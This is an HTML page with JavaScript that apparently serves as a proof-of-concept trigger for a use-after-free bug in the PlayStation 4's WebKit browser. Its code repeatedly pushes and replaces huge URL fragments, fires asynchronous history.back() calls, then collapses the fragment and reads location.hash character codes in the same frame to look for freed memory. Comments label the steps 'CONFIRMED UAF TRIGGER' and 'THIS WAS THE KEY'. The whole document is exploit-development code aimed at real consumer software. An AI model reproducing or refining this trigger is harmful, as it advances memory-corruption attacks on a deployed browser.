<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit — Promising UAF Fragment Test (Reconstructed)</title>
</head>
<body>

<h1>PS4 WebKit – Reconstructed Promising UAF Test</h1>
<button onclick="run()">RUN TEST</button>
<pre id="log"></pre>

<script>
function log(s){
    document.getElementById("log").textContent += s + "\n";
}

function sleep(ms){
    return new Promise(r => setTimeout(r, ms));
}

/* ===============================
   PHASE 1 — CONFIRMED UAF TRIGGER
   =============================== */
async function triggerUAF(){
    log("=== UAF TRIGGER START ===");
    let size = 977;
    const STEP = 14461;

    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));

        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log(`[ITER ${i}] back() async`);
        }
        size += STEP;
        await sleep(5);
    }
    log(">>> UAF WINDOW <<<");
}

/* ===============================
   PHASE 2 — BASELINE READ
   =============================== */
function baselineRead(tag){
    let h = location.hash;
    log(`=== ${tag} ===`);
    log(`URL.length = ${h.length}`);
    [32,64,128,256,512,1024].forEach(o=>{
        log(`charCodeAt(${o}) = ${h.charCodeAt(o)}`);
    });
}

/* ===============================
   PHASE 3 — FRAGMENT ALTERNATION
   (THIS WAS THE KEY)
   =============================== */
function fragmentAlternation(){
    // Small fragment (≈32 bytes)
    let small = "B".repeat(32);
    location.hash = "#" + small;

    // Immediately reintroduce large fragment
    let big = "A".repeat(340000);
    location.hash = "#" + big;
}

/* ===============================
   PHASE 4 — FRAGMENT COLLAPSE
   =============================== */
function fragmentCollapse(){
    log(">>> FRAGMENT COLLAPSE <<<");
    location.hash = "#X";
}

/* ===============================
   PHASE 5 — SAME FRAME READ
   (CRITICAL — DO NOT ASYNC)
   =============================== */
function sameFrameRead(){
    let h = location.hash;
    log("=== POST-COLLAPSE (SAME FRAME) ===");
    log(`URL.length = ${h.length}`);
    [32,64,128,256,512,1024].forEach(o=>{
        log(`charCodeAt(${o}) = ${h.charCodeAt(o)}`);
    });
}

/* ===============================
   FULL TEST SEQUENCE
   =============================== */
async function run(){
    document.getElementById("log").textContent = "";

    await triggerUAF();

    baselineRead("BASELINE (INSIDE WINDOW)");

    // This chaos was present in the old promising runs
    fragmentAlternation();
    fragmentAlternation();
    fragmentAlternation();

    fragmentCollapse();

    // NO await, NO sleep, SAME FRAME READ
    sameFrameRead();

    log("=== TEST END ===");
}
</script>

</body>
</html>
